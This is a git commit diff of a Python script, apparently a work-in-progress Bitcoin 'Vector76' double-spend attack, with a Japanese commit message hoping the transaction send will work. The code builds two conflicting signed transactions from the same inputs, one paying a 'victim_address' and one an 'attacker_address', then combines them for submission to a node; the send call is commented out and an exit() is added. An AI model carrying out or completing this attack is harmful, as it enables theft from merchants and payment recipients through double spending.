a6bf3f6138020825b38995a0555be8f063e5a2d7
h0tcatSub <n0ricatnohotmens@gmail.com>
2024-07-29 17:12:10 +0900

    あとはトランザクションの送信がうまくできれば

--- src/vector76.py
+++ src/vector76.py
@@ -82,12 +82,12 @@ send_amount = to_satoshi(amount_btc)
 inputs = transaction_util.unspent(transaction_util.wiftoaddr(key))
 print(inputs)
 tx_victim = [{"address": victim_address, "value": send_amount}]
-tx_victim = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
+tx_victim = transaction_util.mktx(inputs, tx_victim, fee=fee)
 tx_victim["outs"][0]["value"] = tx_victim["outs"][0]["value"]
 print(tx_victim)
 tx_victim = cryptos.serialize(transaction_util.signall(tx_victim, key))
 tx_attacker = [{"address": attacker_address, "value": send_amount}]
-tx_attacker = transaction_util.mktx_with_change(inputs, tx_attacker, fee=fee)
+tx_attacker = transaction_util.mktx(inputs, tx_attacker, fee=fee)
 tx_attacker["outs"][0]["value"] = tx_attacker["outs"][0]["value"]
 tx_attacker = cryptos.serialize(transaction_util.signall(tx_attacker, key))
 print()
@@ -95,6 +95,7 @@ print()
 tx_vector76 = f"{tx_attacker}{tx_victim}"
 tx_vector76 = cryptos.serialize(transaction_util.signall(tx_vector76, key))
 print(tx_vector76)
+exit()
 #print("Sending Vector76 block your node...")
 #result = rpc_node.sendrawtransaction(tx_vector76)
 #print(f"result : {binascii.hexlify(result)}")
